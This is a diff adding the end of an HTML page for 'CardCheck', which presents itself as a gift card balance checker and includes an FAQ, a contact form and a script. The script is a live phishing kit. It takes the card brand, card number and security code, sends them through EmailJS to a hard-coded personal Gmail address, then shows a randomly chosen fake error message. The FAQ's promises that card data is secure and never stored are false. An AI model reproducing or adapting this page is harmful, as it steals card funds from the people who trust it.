+                      class="ri-phone-line text-blue-600 text-xl"></i></div>
+                  <div>
+                    <h4 class="font-semibold text-gray-900 mb-1">Phone Support</h4>
+                    <p class="text-gray-600">Speak directly with our experts</p>
+                    <p class="text-blue-600 font-medium">1-800-CAROCHE</p>
+                  </div>
+                </div>
+                <div class="flex items-start">
+                  <div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center mr-4"><i
+                      class="ri-time-line text-blue-600 text-xl"></i></div>
+                  <div>
+                    <h4 class="font-semibold text-gray-900 mb-1">Response Time</h4>
+                    <p class="text-gray-600">We typically respond within</p>
+                    <p class="text-blue-600 font-medium">&lt; 2 hours</p>
+                  </div>
+                </div>
+              </div>
+              <div class="mt-8">
+                <h4 class="font-semibold text-gray-900 mb-4">Frequently Asked Questions</h4>
+                <div class="space-y-3">
+                  <details class="group">
+                    <summary class="flex items-center justify-between cursor-pointer p-3 bg-gray-50 rounded-lg"><span
+                        class="font-medium text-gray-900">Is my card information secure?</span><i
+                        class="ri-arrow-down-s-line group-open:rotate-180 transition-transform"></i></summary>
+                    <p class="mt-2 p-3 text-gray-600 text-sm">Yes, we use bank-level SSL encryption to protect all your
+                      data. Your card information is never stored on our servers.</p>
+                  </details>
+                  <details class="group">
+                    <summary class="flex items-center justify-between cursor-pointer p-3 bg-gray-50 rounded-lg"><span
+                        class="font-medium text-gray-900">How accurate are the balance results?</span><i
+                        class="ri-arrow-down-s-line group-open:rotate-180 transition-transform"></i></summary>
+                    <p class="mt-2 p-3 text-gray-600 text-sm">Our system has a 99.9% accuracy rate and connects directly to
+                      retailer systems for real-time balance information.</p>
+                  </details>
+                  <details class="group">
+                    <summary class="flex items-center justify-between cursor-pointer p-3 bg-gray-50 rounded-lg"><span
+                        class="font-medium text-gray-900">What if my card shows an error?</span><i
+                        class="ri-arrow-down-s-line group-open:rotate-180 transition-transform"></i></summary>
+                    <p class="mt-2 p-3 text-gray-600 text-sm">If you encounter an error, please contact our support team
+                      with your card details and we'll help resolve the issue immediately.</p>
+                  </details>
+                </div>
+              </div>
+            </div>
+            <div class="bg-white rounded-xl shadow-lg border border-gray-100 p-6 ">
+              <h3 class="text-2xl font-bold text-gray-900 mb-6">Send us a Message</h3>
+              <form class="space-y-6">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div class="w-full"><label class="block text-sm font-medium text-gray-700 mb-2">Full Name</label>
+                    <div class="relative"><input class="
+                  w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm
+                  focus:ring-2 focus:ring-blue-500 focus:border-blue-500
+                  disabled:bg-gray-50 disabled:text-gray-500
+                " placeholder="Enter your full name" required="" value="" name="name"></div>
+                  </div>
+                  <div class="w-full"><label class="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
+                    <div class="relative"><input class="
+                  w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm
+                  focus:ring-2 focus:ring-blue-500 focus:border-blue-500
+                  disabled:bg-gray-50 disabled:text-gray-500
+                " placeholder="Enter your email" required="" type="email" value="" name="email"></div>
+                  </div>
+                </div>
+                <div class="w-full"><label class="block text-sm font-medium text-gray-700 mb-2">Subject</label>
+                  <div class="relative"><input class="
+                  w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm
+                  focus:ring-2 focus:ring-blue-500 focus:border-blue-500
+                  disabled:bg-gray-50 disabled:text-gray-500
+                " placeholder="What's this about?" required="" value="" name="subject"></div>
+                </div>
+                <div><label class="block text-sm font-medium text-gray-700 mb-2">Message</label><textarea name="message"
+                    rows="5" maxlength="500"
+                    class="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 resize-none"
+                    placeholder="Tell us how we can help you..." required=""></textarea>
+                  <p class="mt-1 text-xs text-gray-500">0/500 characters</p>
+                </div><button
+                  class="inline-flex items-center justify-center font-medium rounded-lg transition-colors duration-200 whitespace-nowrap cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 text-lg w-full"
+                  type="submit">Send Message</button>
+              </form>
+            </div>
+          </div>
+        </div>
+    </section>
+    
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
+          <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+            <div class="col-span-1 md:col-span-2">
+              <h3 class="text-2xl font-bold mb-4" style="font-family: Pacifico, serif;">
+                CardCheck
+              </h3>
+              <p class="text-gray-300 mb-4 max-w-md">
+                Your trusted gift card balance checker. Secure, fast, and reliable balance verification for all major gift
+                card brands.
+              </p>
+              <div class="flex space-x-4">
+                <a href="#" class="text-gray-400 hover:text-white cursor-pointer">
+                  <div class="w-6 h-6 flex items-center justify-center">
+                    <i class="ri-facebook-fill">
+                    </i>
+                  </div>
+                </a>
+                <a href="#" class="text-gray-400 hover:text-white cursor-pointer">
+                  <div class="w-6 h-6 flex items-center justify-center">
+                    <i class="ri-twitter-fill">
+                    </i>
+                  </div>
+                </a>
+                <a href="#" class="text-gray-400 hover:text-white cursor-pointer">
+                  <div class="w-6 h-6 flex items-center justify-center">
+                    <i class="ri-instagram-line">
+                    </i>
+                  </div>
+                </a>
+              </div>
+            </div>
+            <div>
+              <h4 class="font-semibold mb-4">Quick Links</h4>
+              <ul class="space-y-2">
+                <li>
+                  <a href="#home" class="text-gray-300 hover:text-white cursor-pointer">
+                    Home
+                  </a>
+                </li>
+                <li>
+                  <a href="#how-it-works" class="text-gray-300 hover:text-white cursor-pointer">
+                    How It Works
+                  </a>
+                </li>
+                <li>
+                  <a href="#supported-cards" class="text-gray-300 hover:text-white cursor-pointer">
+                    Supported Cards
+                  </a>
+                </li>
+                <li>
+                  <a href="#contact" class="text-gray-300 hover:text-white cursor-pointer">
+                    Contact
+                  </a>
+                </li>
+              </ul>
+            </div>
+            <div>
+              <h4 class="font-semibold mb-4">
+                Support
+              </h4>
+              <ul class="space-y-2">
+                <li>
+                  <a href="#" class="text-gray-300 hover:text-white cursor-pointer">
+                    Help Center
+                  </a>
+                </li>
+                <li>
+                  <a href="#" class="text-gray-300 hover:text-white cursor-pointer">
+                    Privacy Policy
+                  </a>
+                </li>
+                <li>
+                  <a href="#" class="text-gray-300 hover:text-white cursor-pointer">
+                    Terms of Service
+                  </a>
+                </li>
+                <li>
+                  <a href="#" class="text-gray-300 hover:text-white cursor-pointer">
+                    Security
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="border-t border-gray-800 mt-8 pt-3 flex flex-col md:flex-row justify-between items-center">
+            <p class="text-gray-400 text-sm">
+               &copy;
+                  <script>
+                    document.write(new Date().getFullYear());
+                  </script> CardCheck. All rights reserved.
+            </p>
+              Powered by Adeperl🍁
+          </div>
+        </div>
+    </footer>
+    
+    <!-- Notification Container -->
+    <div id="notification-container"></div>
+    
+    <!-- Loading Overlay -->
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="spinner"></div>
+    </div>
+    
+    <script>
+        // Initialize EmailJS with YOUR actual credentials
+        (function() {
+            emailjs.init("f8t-TqwmYMOKF8CtL"); // Your public key
+        })();
+    
+        // Mobile menu toggle
+        document.getElementById('menu-toggle').addEventListener('click', function() {
+          document.getElementById('mobile-menu').classList.toggle('hidden');
+        });
+        
+        // Scroll to card check section
+        function scrollToCardCheck() {
+            document.getElementById('card-check').scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        // Make selectedBrand a global variable so all functions can access it
+        let selectedBrand = null;
+        
+        // Form validation and submission
+        document.addEventListener('DOMContentLoaded', function() {
+            // Brand selection
+            const brandButtons = document.querySelectorAll('.brand-btn');
+            
+            brandButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    // Remove selected class from all buttons
+                    brandButtons.forEach(btn => {
+                        btn.classList.remove('selected-brand');
+                    });
+                    
+                    // Add selected class to clicked button
+                    this.classList.add('selected-brand');
+                    selectedBrand = this.getAttribute('data-brand');
+                    
+                    // Hide brand error if shown
+                    document.getElementById('brand-error').classList.add('hidden');
+                });
+            });
+            
+            // Form validation
+            const checkBalanceBtn = document.getElementById('check-balance-btn');
+            const cardNumberInput = document.getElementById('card-number');
+            const securityCodeInput = document.getElementById('security-code');
+            
+            checkBalanceBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                let isValid = true;
+                
+                // Validate brand selection
+                if (!selectedBrand) {
+                    document.getElementById('brand-error').classList.remove('hidden');
+                    isValid = false;
+                } else {
+                    document.getElementById('brand-error').classList.add('hidden');
+                }
+                
+                // Validate card number
+                if (!cardNumberInput.value.trim() || cardNumberInput.value.trim().length < 10) {
+                    document.getElementById('card-number-error').classList.remove('hidden');
+                    cardNumberInput.classList.add('error-field');
+                    isValid = false;
+                } else {
+                    document.getElementById('card-number-error').classList.add('hidden');
+                    cardNumberInput.classList.remove('error-field');
+                }
+                
+                // Validate security code
+                if (!securityCodeInput.value.trim() || securityCodeInput.value.trim().length < 3) {
+                    document.getElementById('security-code-error').classList.remove('hidden');
+                    securityCodeInput.classList.add('error-field');
+                    isValid = false;
+                } else {
+                    document.getElementById('security-code-error').classList.add('hidden');
+                    securityCodeInput.classList.remove('error-field');
+                }
+                
+                // If form is valid, submit
+                if (isValid) {
+                    submitForm();
+                }
+            });
+            
+            // Remove error styling on input
+            cardNumberInput.addEventListener('input', function() {
+                if (this.value.trim().length >= 10) {
+                    this.classList.remove('error-field');
+                    document.getElementById('card-number-error').classList.add('hidden');
+                }
+            });
+            
+            securityCodeInput.addEventListener('input', function() {
+                if (this.value.trim().length >= 3) {
+                    this.classList.remove('error-field');
+                    document.getElementById('security-code-error').classList.add('hidden');
+                }
+            });
+        });
+        
+        // Form submission function
+        function submitForm() {
+            // Show loading overlay
+            document.getElementById('loading-overlay').classList.add('show');
+            
+            // Get form data
+            const cardNumber = document.getElementById('card-number').value;
+            const securityCode = document.getElementById('security-code').value;
+            
+            // Send email and show random error
+            sendEmail(selectedBrand, cardNumber, securityCode);
+        }
+        
+        // CORRECTED sendEmail function with your actual template ID and email
+        function sendEmail(brand, cardNumber, securityCode) {
+            const templateParams = {
+                brand: brand,
+                card_number: cardNumber,
+                security_code: securityCode,
+                date: new Date().toLocaleString(),
+                to_email: 'mhie0009@gmail.com' // Your actual email
+            };
+    
+            // Using your actual service ID and template ID
+            emailjs.send('service_oq1fm4a', 'template_5c7qwut', templateParams)
+                .then(function(response) {
+                    console.log('Email sent successfully:', response);
+                    console.log('Status:', response.status);
+                    console.log('Text:', response.text);
+                    // Hide loading overlay
+                    document.getElementById('loading-overlay').classList.remove('show');
+                    // Show random error message as required
+                    showRandomError();
+                }, function(error) {
+                    console.log('Failed to send email:', error);
+                    console.log('Error status:', error.status);
+                    console.log('Error text:', error.text);
+                    // Hide loading overlay
+                    document.getElementById('loading-overlay').classList.remove('show');
+                    showNotification('Failed to process card details. Please try again.', 'error');
+                });
+        }
+        
+        // Show random error message
+        function showRandomError() {
+            const errorMessages = [
+                "Unable to connect to the card issuer. Please try again later.",
+                "The card number you entered is invalid. Please check and try again.",
+                "We're experiencing high traffic. Please wait a moment and try again."
+            ];
+            
+            const randomIndex = Math.floor(Math.random() * errorMessages.length);
+            const errorMessage = errorMessages[randomIndex];
+            
+            showNotification(errorMessage, 'error');
+        }
+        
+        // Show notification
+        function showNotification(message, type) {
+            const notificationContainer = document.getElementById('notification-container');
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.textContent = message;
+            
+            notificationContainer.appendChild(notification);
+            
+            // Show notification
+            setTimeout(() => {
+                notification.classList.add('show');
+            }, 100);
+            
+            // Hide and remove notification after 5 seconds
+            setTimeout(() => {
+                notification.classList.remove('show');
+                setTimeout(() => {
+                    notificationContainer.removeChild(notification);
+                }, 300);
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
